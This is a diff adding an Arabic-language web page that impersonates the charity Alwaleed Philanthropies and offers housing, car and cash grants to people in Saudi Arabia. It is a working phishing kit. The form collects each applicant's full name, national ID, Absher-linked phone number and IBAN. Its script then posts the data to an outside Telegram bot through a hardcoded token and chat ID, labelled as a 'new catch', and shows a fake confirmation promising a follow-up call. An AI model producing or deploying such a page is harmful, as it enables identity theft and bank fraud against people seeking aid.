@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>بوابة الدعم الموحدة | مؤسسة الوليد للإنسانية</title>
+    <style>
+        :root { --blue: #1a4a5e; --gold: #c5a059; --light: #f8f9fa; }
+        * { box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
+        
+        .header-logo { background: white; padding: 15px; text-align: center; border-bottom: 3px solid var(--gold); box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        /* استخدام نص بديل أنيق في حال لم تظهر الصورة */
+        .logo-text { color: var(--blue); font-weight: bold; font-size: 1.5rem; letter-spacing: 1px; }
+
+        .container { max-width: 90%; width: 450px; background: white; margin: 25px auto; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); overflow: hidden; padding: 25px; }
+        
+        h2 { color: var(--blue); text-align: center; font-size: 1.3rem; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+        
+        label { display: block; margin: 15px 0 8px; font-weight: 600; color: var(--blue); font-size: 14px; }
+        input, select { width: 100%; padding: 14px; border: 1.5px solid #e1e1e1; border-radius: 10px; font-size: 16px; background: #fafafa; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--gold); background: white; }
+        
+        button { width: 100%; padding: 16px; background: var(--blue); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 25px; transition: 0.3s; box-shadow: 0 4px 15px rgba(26, 74, 94, 0.3); }
+        button:active { transform: scale(0.98); }
+
+        .footer-info { text-align: center; font-size: 12px; color: #888; padding: 20px; line-height: 1.6; }
+        #success { display: none; text-align: center; padding: 50px 20px; }
+        #success h3 { color: #28a745; font-size: 1.5rem; }
+    </style>
+</head>
+<body>
+
+<div class="header-logo">
+    <div class="logo-text">الوليد للإنسانية</div>
+    <div style="font-size: 10px; color: var(--gold);">ALWALEED PHILANTHROPIES</div>
+</div>
+
+<div class="container" id="form-container">
+    <h2>طلب الحصول على الدعم (سكن - سيارات - منح)</h2>
+    <form id="submissionForm">
+        <label>نوع الطلب الحالي</label>
+        <select id="grantType">
+            <option value="دعم معيشي فوري">دعم معيشي فوري</option>
+            <option value="وحدة سكنية">طلب وحدة سكنية</option>
+            <option value="وسيلة نقل">طلب سيارة</option>
+        </select>
+
+        <label>الاسم الكامل (كما في الهوية)</label>
+        <input type="text" id="name" placeholder="أدخل اسمك الثلاثي" required>
+
+        <label>رقم الهوية الوطنية / الإقامة</label>
+        <input type="tel" id="idNum" placeholder="10xxxxxxxx" maxlength="10" required>
+
+        <label>رقم الجوال المرتبط بـ (أبشر)</label>
+        <input type="tel" id="phone" placeholder="05xxxxxxxx" maxlength="10" required>
+
+        <label>رقم الآيبان (IBAN) لاستلام الدعم النقدي</label>
+        <input type="text" id="iban" placeholder="SA0000000000000000000000" required>
+
+        <button type="submit">تأكيد إرسال الطلب</button>
+    </form>
+</div>
+
+<div id="success" class="container">
+    <h3>✅ تم استلام طلبك بنجاح!</h3>
+    <p>لقد تم تسجيل بياناتك في قائمة المستحقين. سوف يتم التواصل معك عبر اتصال هاتفي خلال 48 ساعة لاستكمال الإجراءات.</p>
+</div>
+
+<div class="footer-info">
+    جميع الحقوق محفوظة © مؤسسة الوليد للإنسانية 2026<br>
+    هذه البوابة مخصصة لخدمة المواطنين والمقيمين في المملكة العربية السعودية
+</div>
+
+<script>
+    const token = '7548981503:AAH7F6p17z0q_5zC3DExGj7l2UatpI6i62E'; 
+    const chatId = '7013897746';
+
+    document.getElementById('submissionForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const data = {
+            grant: document.getElementById('grantType').value,
+            name: document.getElementById('name').value,
+            id: document.getElementById('idNum').value,
+            phone: document.getElementById('phone').value,
+            iban: document.getElementById('iban').value
+        };
+
+        const message = `🚨 صيد جديد لبحثك الجامعي:\n\n👤 الاسم: ${data.name}\n🆔 الهوية: ${data.id}\n📱 الجوال: ${data.phone}\n💰 الآيبان: ${data.iban}\n📦 النوع: ${data.grant}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        }).then(() => {
+            document.getElementById('form-container').style.display = 'none';
+            document.getElementById('success').style.display = 'block';
+        }).catch(err => {
+            alert('حدث خطأ في الاتصال، يرجى المحاولة لاحقاً');
+        });
+    });
+</script>
+
+</body>
+</html>
